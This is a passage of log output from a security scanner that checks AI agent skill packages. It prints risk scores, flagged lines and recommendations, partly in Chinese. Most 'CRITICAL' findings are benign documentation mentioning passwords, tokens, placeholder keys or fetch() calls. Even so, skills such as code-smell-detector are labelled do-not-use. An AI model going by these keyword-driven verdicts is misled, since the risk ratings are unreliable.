    Confidence: MEDIUM
  [FILE001] in code-change-summarizer/SKILL.md:210
    Pattern: - Introduced `TokenManager` for token lifecycle management
    Confidence: MEDIUM
  [FILE001] in code-change-summarizer/SKILL.md:243
    Pattern: - `jsonwebtoken@8.5.1` → `jsonwebtoken@9.0.0` - Updated for Node 18 support
    Confidence: MEDIUM
  [FILE001] in code-change-summarizer/SKILL.md:246
    Pattern: - `bcrypt@5.0.1` - Replaced by OAuth2, no longer needed for password hashing
    Confidence: MEDIUM
  and 7 more

[*] Summary:
  Total Files Scanned: 2
  Critical Issues: 17
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 17

[*] Recommendation: NOT RECOMMENDED - 检测到高风险问题

Report saved to: report/code-change-summarizer.html
Scanning: code-change-summarizer

[*] Scanning Skill: code-change-summarizer

[!!] Risk Level: HIGH (7.7/10)

[!] CRITICAL Issues (17):
  [FILE001] in code-change-summarizer/SKILL.md:105
    Pattern: - User model to include OAuth tokens
    Confidence: MEDIUM
  [FILE001] in code-change-summarizer/SKILL.md:111
    Pattern: - Memory leak in token refresh
    Confidence: MEDIUM
  [FILE001] in code-change-summarizer/SKILL.md:160
    Pattern: 3. Handle new response format with OAuth tokens
    Confidence: MEDIUM
  [FILE001] in code-change-summarizer/SKILL.md:165
    Pattern: { "username": "user", "password": "pass" }
    Confidence: MEDIUM
  [FILE001] in code-change-summarizer/SKILL.md:171
    Pattern: { "username": "user", "password": "pass", "provider": "google" }
    Confidence: MEDIUM
  [FILE001] in code-change-summarizer/SKILL.md:199
    Pattern: manages token exchange and refresh.
    Confidence: MEDIUM
  [FILE001] in code-change-summarizer/SKILL.md:206
    Pattern: - **Token storage:** Store refresh tokens in secure HTTP-only cookies
    Confidence: MEDIUM
  [FILE001] in code-change-summarizer/SKILL.md:210
    Pattern: - Introduced `TokenManager` for token lifecycle management
    Confidence: MEDIUM
  [FILE001] in code-change-summarizer/SKILL.md:243
    Pattern: - `jsonwebtoken@8.5.1` → `jsonwebtoken@9.0.0` - Updated for Node 18 support
    Confidence: MEDIUM
  [FILE001] in code-change-summarizer/SKILL.md:246
    Pattern: - `bcrypt@5.0.1` - Replaced by OAuth2, no longer needed for password hashing
    Confidence: MEDIUM
  and 7 more

[*] Summary:
  Total Files Scanned: 2
  Critical Issues: 17
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 17

[*] Recommendation: NOT RECOMMENDED - 检测到高风险问题

Report saved to: report/code-change-summarizer.json
Scanning: code-comment-generator

[*] Scanning Skill: code-comment-generator

[!!] Risk Level: HIGH (7.2/10)

[!] CRITICAL Issues (16):
  [FILE001] in code-comment-generator/references/style_guides.md:25
    Pattern: This module provides functions for user login, logout, password management,
    Confidence: MEDIUM
  [FILE001] in code-comment-generator/references/style_guides.md:26
    Pattern: and permission checking. Uses JWT tokens for stateless authentication.
    Confidence: MEDIUM
  [FILE001] in code-comment-generator/references/style_guides.md:31
    Pattern: user = authenticate(username, password)
    Confidence: MEDIUM
  [FILE001] in code-comment-generator/references/style_guides.md:618
    Pattern: │  password  │              │
    Confidence: MEDIUM
  [FILE001] in code-comment-generator/references/style_guides.md:624
    Pattern: │   token    │              │
    Confidence: MEDIUM
  [FILE001] in code-comment-generator/references/comment_examples.md:152
    Pattern: api_key: API key for authentication
    Confidence: MEDIUM
  [FILE001] in code-comment-generator/references/comment_examples.md:158
    Pattern: >>> client = PaymentAPIClient(api_key="pk_live_...")
    Confidence: MEDIUM
  [FILE001] in code-comment-generator/references/comment_examples.md:159
    Pattern: >>> result = client.charge(amount=1000, token="tok_visa")
    Confidence: MEDIUM
  [FILE001] in code-comment-generator/references/comment_examples.md:164
    Pattern: def __init__(self, api_key: str, timeout: int = 30):
    Confidence: MEDIUM
  [FILE001] in code-comment-generator/references/comment_examples.md:169
    Pattern: api_key: Secret API key from payment provider dashboard
    Confidence: MEDIUM
  and 6 more

[*] Summary:
  Total Files Scanned: 3
  Critical Issues: 16
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 16

[*] Recommendation: NOT RECOMMENDED - 检测到高风险问题

Report saved to: report/code-comment-generator.html
Scanning: code-comment-generator

[*] Scanning Skill: code-comment-generator

[!!] Risk Level: HIGH (7.2/10)

[!] CRITICAL Issues (16):
  [FILE001] in code-comment-generator/references/style_guides.md:25
    Pattern: This module provides functions for user login, logout, password management,
    Confidence: MEDIUM
  [FILE001] in code-comment-generator/references/style_guides.md:26
    Pattern: and permission checking. Uses JWT tokens for stateless authentication.
    Confidence: MEDIUM
  [FILE001] in code-comment-generator/references/style_guides.md:31
    Pattern: user = authenticate(username, password)
    Confidence: MEDIUM
  [FILE001] in code-comment-generator/references/style_guides.md:618
    Pattern: │  password  │              │
    Confidence: MEDIUM
  [FILE001] in code-comment-generator/references/style_guides.md:624
    Pattern: │   token    │              │
    Confidence: MEDIUM
  [FILE001] in code-comment-generator/references/comment_examples.md:152
    Pattern: api_key: API key for authentication
    Confidence: MEDIUM
  [FILE001] in code-comment-generator/references/comment_examples.md:158
    Pattern: >>> client = PaymentAPIClient(api_key="pk_live_...")
    Confidence: MEDIUM
  [FILE001] in code-comment-generator/references/comment_examples.md:159
    Pattern: >>> result = client.charge(amount=1000, token="tok_visa")
    Confidence: MEDIUM
  [FILE001] in code-comment-generator/references/comment_examples.md:164
    Pattern: def __init__(self, api_key: str, timeout: int = 30):
    Confidence: MEDIUM
  [FILE001] in code-comment-generator/references/comment_examples.md:169
    Pattern: api_key: Secret API key from payment provider dashboard
    Confidence: MEDIUM
  and 6 more

[*] Summary:
  Total Files Scanned: 3
  Critical Issues: 16
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 16

[*] Recommendation: NOT RECOMMENDED - 检测到高风险问题

Report saved to: report/code-comment-generator.json
Scanning: code-completion-semantic-constraints

[*] Scanning Skill: code-completion-semantic-constraints

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/code-completion-semantic-constraints.html
Scanning: code-completion-semantic-constraints

[*] Scanning Skill: code-completion-semantic-constraints

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/code-completion-semantic-constraints.json
Scanning: code-instrumentation-generator

[*] Scanning Skill: code-instrumentation-generator

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/code-instrumentation-generator.html
Scanning: code-instrumentation-generator

[*] Scanning Skill: code-instrumentation-generator

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/code-instrumentation-generator.json
Scanning: code-optimizer

[*] Scanning Skill: code-optimizer

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/code-optimizer.html
Scanning: code-optimizer

[*] Scanning Skill: code-optimizer

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/code-optimizer.json
Scanning: code-pattern-extractor

[*] Scanning Skill: code-pattern-extractor

[OK] Risk Level: SAFE (0.4/10)

[!] CRITICAL Issues (1):
  [NET001] in code-pattern-extractor/SKILL.md:58
    Pattern: const response = await fetch(url);
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 1
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 1

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/code-pattern-extractor.html
Scanning: code-pattern-extractor

[*] Scanning Skill: code-pattern-extractor

[OK] Risk Level: SAFE (0.4/10)

[!] CRITICAL Issues (1):
  [NET001] in code-pattern-extractor/SKILL.md:58
    Pattern: const response = await fetch(url);
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 1
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 1

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/code-pattern-extractor.json
Scanning: code-refactoring-assistant

[*] Scanning Skill: code-refactoring-assistant

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/code-refactoring-assistant.html
Scanning: code-refactoring-assistant

[*] Scanning Skill: code-refactoring-assistant

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/code-refactoring-assistant.json
Scanning: code-repair-generation-combo

[*] Scanning Skill: code-repair-generation-combo

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 5
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/code-repair-generation-combo.html
Scanning: code-repair-generation-combo

[*] Scanning Skill: code-repair-generation-combo

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 5
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/code-repair-generation-combo.json
Scanning: code-review-assistant

[*] Scanning Skill: code-review-assistant

[OK] Risk Level: SAFE (0.4/10)

[!] CRITICAL Issues (1):
  [FILE001] in code-review-assistant/SKILL.md:352
    Pattern: - ✅ Password hashing used (not plain text)?
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 1
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 1

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/code-review-assistant.html
Scanning: code-review-assistant

[*] Scanning Skill: code-review-assistant

[OK] Risk Level: SAFE (0.4/10)

[!] CRITICAL Issues (1):
  [FILE001] in code-review-assistant/SKILL.md:352
    Pattern: - ✅ Password hashing used (not plain text)?
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 1
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 1

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/code-review-assistant.json
Scanning: code-search-assistant

[*] Scanning Skill: code-search-assistant

[?] Risk Level: LOW (3.0/10)

[!] CRITICAL Issues (9):
  [NET001] in code-search-assistant/SKILL.md:63
    Pattern: // Input snippet calls: fetch(), JSON.parse(), setState()
    Confidence: LOW
  [NET001] in code-search-assistant/SKILL.md:64
    Pattern: // High match: Code that calls fetch() → JSON.parse() → setState()
    Confidence: LOW
  [NET001] in code-search-assistant/SKILL.md:65
    Pattern: // Medium match: Code that calls fetch() and setState() in different order
    Confidence: LOW
  [NET001] in code-search-assistant/SKILL.md:66
    Pattern: // Low match: Code that only calls fetch()
    Confidence: LOW
  [NET001] in code-search-assistant/SKILL.md:203
    Pattern: const response = await fetch(`/api/users/${userId}`);
    Confidence: MEDIUM
  [NET001] in code-search-assistant/SKILL.md:214
    Pattern: 1. Call chain: Search for `fetch()`, `response.json()`, `console.error()`
    Confidence: MEDIUM
  [FILE001] in code-search-assistant/SKILL.md:34
    Pattern: - Code tokens and keywords
    Confidence: MEDIUM
  [FILE001] in code-search-assistant/SKILL.md:71
    Pattern: Find code with similar structure and token patterns.
    Confidence: MEDIUM
  [FILE001] in code-search-assistant/SKILL.md:105
    Pattern: - **Authentication/Authorization**: Login, permission checks, token handling
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 9
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 9

[*] Recommendation: USE WITH CAUTION - 存在轻微风险

Report saved to: report/code-search-assistant.html
Scanning: code-search-assistant

[*] Scanning Skill: code-search-assistant

[?] Risk Level: LOW (3.0/10)

[!] CRITICAL Issues (9):
  [NET001] in code-search-assistant/SKILL.md:63
    Pattern: // Input snippet calls: fetch(), JSON.parse(), setState()
    Confidence: LOW
  [NET001] in code-search-assistant/SKILL.md:64
    Pattern: // High match: Code that calls fetch() → JSON.parse() → setState()
    Confidence: LOW
  [NET001] in code-search-assistant/SKILL.md:65
    Pattern: // Medium match: Code that calls fetch() and setState() in different order
    Confidence: LOW
  [NET001] in code-search-assistant/SKILL.md:66
    Pattern: // Low match: Code that only calls fetch()
    Confidence: LOW
  [NET001] in code-search-assistant/SKILL.md:203
    Pattern: const response = await fetch(`/api/users/${userId}`);
    Confidence: MEDIUM
  [NET001] in code-search-assistant/SKILL.md:214
    Pattern: 1. Call chain: Search for `fetch()`, `response.json()`, `console.error()`
    Confidence: MEDIUM
  [FILE001] in code-search-assistant/SKILL.md:34
    Pattern: - Code tokens and keywords
    Confidence: MEDIUM
  [FILE001] in code-search-assistant/SKILL.md:71
    Pattern: Find code with similar structure and token patterns.
    Confidence: MEDIUM
  [FILE001] in code-search-assistant/SKILL.md:105
    Pattern: - **Authentication/Authorization**: Login, permission checks, token handling
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 9
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 9

[*] Recommendation: USE WITH CAUTION - 存在轻微风险

Report saved to: report/code-search-assistant.json
Scanning: code-smell-detector

[*] Scanning Skill: code-smell-detector

[!] Risk Level: CRITICAL (8.6/10)

[!] CRITICAL Issues (19):
  [FILE001] in code-smell-detector/SKILL.md:223
    Pattern: def authenticate(self, username, password): pass
    Confidence: MEDIUM
  [FILE001] in code-smell-detector/SKILL.md:224
    Pattern: def hash_password(self, password): pass
    Confidence: MEDIUM
  [FILE001] in code-smell-detector/SKILL.md:226
    Pattern: def send_password_reset(self, user): pass
    Confidence: MEDIUM
  [FILE001] in code-smell-detector/SKILL.md:241
    Pattern: def authenticate(self, username, password): pass
    Confidence: MEDIUM
  [FILE001] in code-smell-detector/SKILL.md:242
    Pattern: def hash_password(self, password): pass
    Confidence: MEDIUM
  [FILE001] in code-smell-detector/SKILL.md:243
    Pattern: def validate_password_strength(self, password): pass
    Confidence: MEDIUM
  [FILE001] in code-smell-detector/SKILL.md:248
    Pattern: def send_password_reset(self, user): pass
    Confidence: MEDIUM
  [FILE001] in code-smell-detector/references/smell-patterns.md:222
    Pattern: def authenticate_user(self, username, password): pass
    Confidence: MEDIUM
  [FILE001] in code-smell-detector/references/smell-patterns.md:224
    Pattern: def send_password_reset_email(self, user): pass
    Confidence: MEDIUM
  [FILE001] in code-smell-detector/references/smell-patterns.md:225
    Pattern: def generate_password_reset_token(self, user): pass
    Confidence: MEDIUM
  and 9 more

[*] Summary:
  Total Files Scanned: 4
  Critical Issues: 19
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 19

[*] Recommendation: DO NOT USE THIS SKILL - 检测到严重安全风险

Report saved to: report/code-smell-detector.html
Scanning: code-smell-detector

[*] Scanning Skill: code-smell-detector

[!] Risk Level: CRITICAL (8.6/10)

[!] CRITICAL Issues (19):
  [FILE001] in code-smell-detector/SKILL.md:223
    Pattern: def authenticate(self, username, password): pass
    Confidence: MEDIUM
  [FILE001] in code-smell-detector/SKILL.md:224
    Pattern: def hash_password(self, password): pass
    Confidence: MEDIUM
  [FILE001] in code-smell-detector/SKILL.md:226
    Pattern: def send_password_reset(self, user): pass
    Confidence: MEDIUM
  [FILE001] in code-smell-detector/SKILL.md:241
    Pattern: def authenticate(self, username, password): pass
    Confidence: MEDIUM
  [FILE001] in code-smell-detector/SKILL.md:242
    Pattern: def hash_password(self, password): pass
    Confidence: MEDIUM
  [FILE001] in code-smell-detector/SKILL.md:243
    Pattern: def validate_password_strength(self, password): pass
    Confidence: MEDIUM
  [FILE001] in code-smell-detector/SKILL.md:248
    Pattern: def send_password_reset(self, user): pass
    Confidence: MEDIUM
  [FILE001] in code-smell-detector/references/smell-patterns.md:222
    Pattern: def authenticate_user(self, username, password): pass
    Confidence: MEDIUM
  [FILE001] in code-smell-detector/references/smell-patterns.md:224
    Pattern: def send_password_reset_email(self, user): pass
    Confidence: MEDIUM
  [FILE001] in code-smell-detector/references/smell-patterns.md:225
    Pattern: def generate_password_reset_token(self, user): pass
    Confidence: MEDIUM
  and 9 more

[*] Summary:
  Total Files Scanned: 4
  Critical Issues: 19
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 19

[*] Recommendation: DO NOT USE THIS SKILL - 检测到严重安全风险

Report saved to: report/code-smell-detector.json
Scanning: code-summarizer

[*] Scanning Skill: code-summarizer

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/code-summarizer.html
Scanning: code-summarizer

[*] Scanning Skill: code-summarizer

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/code-summarizer.json
Scanning: code-translation

[*] Scanning Skill: code-translation

[?] Risk Level: MEDIUM (5.8/10)

[!] CRITICAL Issues (15):
  [NET001] in code-translation/SKILL.md:91
    Pattern: const response = await fetch(`/api/users/${userId}`);
    Confidence: MEDIUM
  [NET001] in code-translation/SKILL.md:241
    Pattern: tasks = [fetch(url) for url in urls]
    Confidence: MEDIUM
  [NET001] in code-translation/SKILL.md:247
    Pattern: const promises = urls.map(url => fetch(url));
    Confidence: MEDIUM
  [NET001] in code-translation/SKILL.md:380
    Pattern: response = requests.get(url)
    Confidence: MEDIUM
  [NET001] in code-translation/SKILL.md:385
    Pattern: const response = await fetch(url);
    Confidence: MEDIUM
  [FILE001] in code-translation/references/language_patterns.md:459
    Pattern: const value = data.key;
    Confidence: MEDIUM
  [NET001] in code-translation/references/project_migration.md:504
    Pattern: tasks = [fetch(url) for url in urls]
    Confidence: MEDIUM
  [NET001] in code-translation/references/project_migration.md:518
    Pattern: results[idx] = fetch(u)
    Confidence: MEDIUM
  [FILE001] in code-translation/references/project_migration.md:356
    Pattern: API_KEY=secret123
    Confidence: MEDIUM
  [FILE001] in code-translation/references/project_migration.md:369
    Pattern: API_KEY = os.getenv("API_KEY")
    Confidence: MEDIUM
  and 5 more

[*] Summary:
  Total Files Scanned: 4
  Critical Issues: 15
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 15

[*] Recommendation: REVIEW NEEDED - 请人工审查后使用

Report saved to: report/code-translation.html
Scanning: code-translation

[*] Scanning Skill: code-translation

[?] Risk Level: MEDIUM (5.8/10)

[!] CRITICAL Issues (15):
  [NET001] in code-translation/SKILL.md:91
    Pattern: const response = await fetch(`/api/users/${userId}`);
    Confidence: MEDIUM
  [NET001] in code-translation/SKILL.md:241
    Pattern: tasks = [fetch(url) for url in urls]
    Confidence: MEDIUM
  [NET001] in code-translation/SKILL.md:247
    Pattern: const promises = urls.map(url => fetch(url));
    Confidence: MEDIUM
  [NET001] in code-translation/SKILL.md:380
    Pattern: response = requests.get(url)
    Confidence: MEDIUM
  [NET001] in code-translation/SKILL.md:385
    Pattern: const response = await fetch(url);
    Confidence: MEDIUM
  [FILE001] in code-translation/references/language_patterns.md:459
    Pattern: const value = data.key;
    Confidence: MEDIUM
  [NET001] in code-translation/references/project_migration.md:504
    Pattern: tasks = [fetch(url) for url in urls]
    Confidence: MEDIUM
  [NET001] in code-translation/references/project_migration.md:518
    Pattern: results[idx] = fetch(u)
    Confidence: MEDIUM
  [FILE001] in code-translation/references/project_migration.md:356
    Pattern: API_KEY=secret123
    Confidence: MEDIUM
  [FILE001] in code-translation/references/project_migration.md:369
    Pattern: API_KEY = os.getenv("API_KEY")
    Confidence: MEDIUM
  and 5 more

[*] Summary:
  Total Files Scanned: 4
  Critical Issues: 15
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 15

[*] Recommendation: REVIEW NEEDED - 请人工审查后使用

Report saved to: report/code-translation.json
Scanning: component-boundary-identifier

[*] Scanning Skill: component-boundary-identifier

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 4
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/component-boundary-identifier.html
Scanning: component-boundary-identifier

[*] Scanning Skill: component-boundary-identifier

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 4
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/component-boundary-identifier.json
Scanning: config-consistency-checker

[*] Scanning Skill: config-consistency-checker

[?] Risk Level: LOW (2.7/10)

[!] CRITICAL Issues (6):
  [FILE001] in config-consistency-checker/SKILL.md:109
    Pattern: DATABASE_PASSWORD=secret123
    Confidence: MEDIUM
  [FILE001] in config-consistency-checker/SKILL.md:110
    Pattern: API_KEY=hardcoded-key-here
    Confidence: MEDIUM
  [FILE001] in config-consistency-checker/SKILL.md:114
    Pattern: - Hardcoded password
    Confidence: MEDIUM
  [FILE001] in config-consistency-checker/SKILL.md:151
    Pattern: - `password`, `secret`, `key` with hardcoded values
    Confidence: MEDIUM
  [FILE001] in config-consistency-checker/SKILL.md:176
    Pattern: 2. Security Issue: Hardcoded password in dev.json
    Confidence: MEDIUM
  [FILE001] in config-consistency-checker/SKILL.md:178
    Pattern: Resolution: Use environment variable ${DB_PASSWORD}
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 6
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 6

[*] Recommendation: USE WITH CAUTION - 存在轻微风险

Report saved to: report/config-consistency-checker.html
Scanning: config-consistency-checker

[*] Scanning Skill: config-consistency-checker

[?] Risk Level: LOW (2.7/10)

[!] CRITICAL Issues (6):
  [FILE001] in config-consistency-checker/SKILL.md:109
    Pattern: DATABASE_PASSWORD=secret123
    Confidence: MEDIUM
  [FILE001] in config-consistency-checker/SKILL.md:110
    Pattern: API_KEY=hardcoded-key-here
    Confidence: MEDIUM
  [FILE001] in config-consistency-checker/SKILL.md:114
    Pattern: - Hardcoded password
    Confidence: MEDIUM
  [FILE001] in config-consistency-checker/SKILL.md:151
    Pattern: - `password`, `secret`, `key` with hardcoded values
    Confidence: MEDIUM
  [FILE001] in config-consistency-checker/SKILL.md:176
    Pattern: 2. Security Issue: Hardcoded password in dev.json
    Confidence: MEDIUM
  [FILE001] in config-consistency-checker/SKILL.md:178
    Pattern: Resolution: Use environment variable ${DB_PASSWORD}
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 6
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 6

[*] Recommendation: USE WITH CAUTION - 存在轻微风险

Report saved to: report/config-consistency-checker.json
Scanning: configuration-generator

[*] Scanning Skill: configuration-generator

[!!] Risk Level: HIGH (6.8/10)

[!] CRITICAL Issues (16):
  [FILE001] in configuration-generator/SKILL.md:419
    Pattern: api-key: "secret-key"
    Confidence: MEDIUM
  [FILE001] in configuration-generator/references/app_configs.md:413
    Pattern: DATABASE_URL=postgresql://user:password@localhost:5432/app_db
    Confidence: MEDIUM
  [FILE001] in configuration-generator/references/app_configs.md:430
    Pattern: SMTP_PASSWORD=your-email-password
    Confidence: MEDIUM
  [NET001] in configuration-generator/references/infra_configs.md:482
    Pattern: - curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/...
    Confidence: MEDIUM
  [FILE001] in configuration-generator/references/infra_configs.md:148
    Pattern: DATABASE_URL: "postgresql://user:password@postgres:5432/db"
    Confidence: MEDIUM
  [FILE001] in configuration-generator/references/infra_configs.md:447
    Pattern: POSTGRES_PASSWORD: postgres
    Confidence: MEDIUM
  [FILE001] in configuration-generator/references/infra_configs.md:468
    Pattern: - docker login -u $CI_REGISTRY_USER -p $CI_REGISTRY_PASSWORD $CI_REGISTRY
    Confidence: MEDIUM
  [FILE001] in configuration-generator/references/infra_configs.md:508
    Pattern: POSTGRES_PASSWORD: postgres
    Confidence: MEDIUM
  [FILE001] in configuration-generator/references/infra_configs.md:622
    Pattern: ssl_certificate /etc/nginx/ssl/cert.pem;
    Confidence: MEDIUM
  [FILE001] in configuration-generator/references/infra_configs.md:623
    Pattern: ssl_certificate_key /etc/nginx/ssl/key.pem;
    Confidence: MEDIUM
  and 6 more

[*] WARNING Issues (1):
  [DEP002] in configuration-generator/assets/github-actions-workflow.yml:54
    Pattern: python -m pip install --upgrade pip
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 6
  Critical Issues: 16
  Warning Issues: 1
  Info Issues: 0
  Total Issues: 17

[*] Recommendation: NOT RECOMMENDED - 检测到高风险问题

Report saved to: report/configuration-generator.html
Scanning: configuration-generator

[*] Scanning Skill: configuration-generator

[!!] Risk Level: HIGH (6.8/10)

[!] CRITICAL Issues (16):
  [FILE001] in configuration-generator/SKILL.md:419
    Pattern: api-key: "secret-key"
    Confidence: MEDIUM
  [FILE001] in configuration-generator/references/app_configs.md:413
    Pattern: DATABASE_URL=postgresql://user:password@localhost:5432/app_db
    Confidence: MEDIUM
  [FILE001] in configuration-generator/references/app_configs.md:430
    Pattern: SMTP_PASSWORD=your-email-password
    Confidence: MEDIUM
  [NET001] in configuration-generator/references/infra_configs.md:482
    Pattern: - curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/...
    Confidence: MEDIUM
  [FILE001] in configuration-generator/references/infra_configs.md:148
    Pattern: DATABASE_URL: "postgresql://user:password@postgres:5432/db"
    Confidence: MEDIUM
  [FILE001] in configuration-generator/references/infra_configs.md:447
    Pattern: POSTGRES_PASSWORD: postgres
    Confidence: MEDIUM
  [FILE001] in configuration-generator/references/infra_configs.md:468
    Pattern: - docker login -u $CI_REGISTRY_USER -p $CI_REGISTRY_PASSWORD $CI_REGISTRY
    Confidence: MEDIUM
  [FILE001] in configuration-generator/references/infra_configs.md:508
    Pattern: POSTGRES_PASSWORD: postgres
    Confidence: MEDIUM
  [FILE001] in configuration-generator/references/infra_configs.md:622
    Pattern: ssl_certificate /etc/nginx/ssl/cert.pem;
    Confidence: MEDIUM
  [FILE001] in configuration-generator/references/infra_configs.md:623
    Pattern: ssl_certificate_key /etc/nginx/ssl/key.pem;
    Confidence: MEDIUM
  and 6 more

[*] WARNING Issues (1):
  [DEP002] in configuration-generator/assets/github-actions-workflow.yml:54
    Pattern: python -m pip install --upgrade pip
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 6
  Critical Issues: 16
  Warning Issues: 1
  Info Issues: 0
  Total Issues: 17

[*] Recommendation: NOT RECOMMENDED - 检测到高风险问题

Report saved to: report/configuration-generator.json
Scanning: conflict-analyzer

[*] Scanning Skill: conflict-analyzer

[OK] Risk Level: SAFE (1.4/10)

[!] CRITICAL Issues (3):
  [FILE001] in conflict-analyzer/references/conflict_patterns.md:169
    Pattern: - REQ-A: "Password must be at least 12 characters"
    Confidence: MEDIUM
  [FILE001] in conflict-analyzer/references/conflict_patterns.md:170
    Pattern: - REQ-B: "Support legacy accounts with 6-character passwords"
    Confidence: MEDIUM
  [FILE001] in conflict-analyzer/references/resolution_strategies.md:153
    Pattern: Conflict: "Password must be 12+ characters" vs "Support legacy 6-character pa...
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 4
  Critical Issues: 3
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 3

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/conflict-analyzer.html
Scanning: conflict-analyzer

[*] Scanning Skill: conflict-analyzer

[OK] Risk Level: SAFE (1.4/10)

[!] CRITICAL Issues (3):
  [FILE001] in conflict-analyzer/references/conflict_patterns.md:169
    Pattern: - REQ-A: "Password must be at least 12 characters"
    Confidence: MEDIUM
  [FILE001] in conflict-analyzer/references/conflict_patterns.md:170
    Pattern: - REQ-B: "Support legacy accounts with 6-character passwords"
    Confidence: MEDIUM
  [FILE001] in conflict-analyzer/references/resolution_strategies.md:153
    Pattern: Conflict: "Password must be 12+ characters" vs "Support legacy 6-character pa...
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 4
  Critical Issues: 3
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 3

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/conflict-analyzer.json
Scanning: containerization-assistant

[*] Scanning Skill: containerization-assistant

[!!] Risk Level: HIGH (6.9/10)

[!] CRITICAL Issues (16):
  [FILE001] in containerization-assistant/SKILL.md:36
    Pattern: cp assets/.env.example ./.env
    Confidence: MEDIUM
  [FILE001] in containerization-assistant/SKILL.md:86
    Pattern: **Environment template** (`assets/.env.example`):
    Confidence: MEDIUM
  [FILE001] in containerization-assistant/SKILL.md:384
    Pattern: api_key: "secret-key"
    Confidence: MEDIUM
  [FILE001] in containerization-assistant/SKILL.md:506
